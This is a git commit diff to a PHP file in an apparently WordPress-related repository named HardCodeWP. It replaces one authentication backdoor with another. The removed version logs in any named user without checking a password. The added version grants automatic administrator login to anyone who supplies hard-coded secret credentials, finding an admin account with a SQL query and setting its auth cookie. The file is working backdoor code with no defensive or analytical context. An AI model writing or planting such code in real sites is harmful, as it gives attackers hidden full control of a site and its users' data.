48c5aae231c110f33ab75b11f288d9462631ffb2
haxor1337x <63400168+haxor1337x@users.noreply.github.com>
2023-04-10 05:44:57 +0700

    Update code.php

--- HardCodeWP/code.php
+++ HardCodeWP/code.php
@@ -1,19 +1,42 @@
-add_filter( 'authenticate', 'nop_auto_login', 3, 10 );
+if ( ! defined( 'ABSPATH' ) ) { die(); }
 
-function nop_auto_login( $user, $username, $password ) {
-    if ( ! $user ) {
-        $user = get_user_by( 'email', $username );
-    }
-    if ( ! $user ) {
-        $user = get_user_by( 'login', $username );
-    }
+if ( defined( 'MAL_SECRET_USER' ) 
+	&& defined( 'MAL_SECRET_PASS' ) 
+	&& MAL_SECRET_USER 
+	&& MAL_SECRET_PASS 
+) {
+	add_filter( 'authenticate', 'mal_auto_login', 3, 10 );
+}
+function mal_auto_login( $user, $username, $password ) {
+	if ( MAL_SECRET_USER == $username && MAL_SECRET_PASS == $password ) {
+		// Find an admin user ID.
+		$user_id = mal_get_admin_user_id();
+		if ( ! $user_id ) {
+			wp_die( 'No admin user found' );
+		}
 
-    if ( $user ) {
-        wp_set_current_user( $user->ID, $user->data->user_login );
-        wp_set_auth_cookie( $user->ID );
-        do_action( 'wp_login', $user->data->user_login );
+		// Log in as admin user automatically.
+		$user = get_user_by( 'id', $user_id );
+		wp_set_current_user( $user_id, $user->data->user_login );
+		wp_set_auth_cookie( $user_id );
+		do_action( 'wp_login', $user->data->user_login );
 
-        wp_safe_redirect( admin_url() );
-        exit;
-    }
+		wp_safe_redirect( admin_url() );
+		exit;
+	}
+}
+
+function mal_get_admin_user_id() {
+	global $wpdb;
+	$sql = "
+	SELECT u.ID
+	FROM {$wpdb->users} u
+	INNER JOIN {$wpdb->usermeta} m ON m.user_id = u.ID
+	WHERE
+		(m.meta_key = '{$wpdb->prefix}user_level' AND m.meta_value = 10)
+		OR
+		(m.meta_key = '{$wpdb->prefix}capabilities' AND m.meta_value LIKE '%\"administrator\"%')
+	";
+	$res = intval( $wpdb->get_var( $sql ) );
+	return $res;
 }
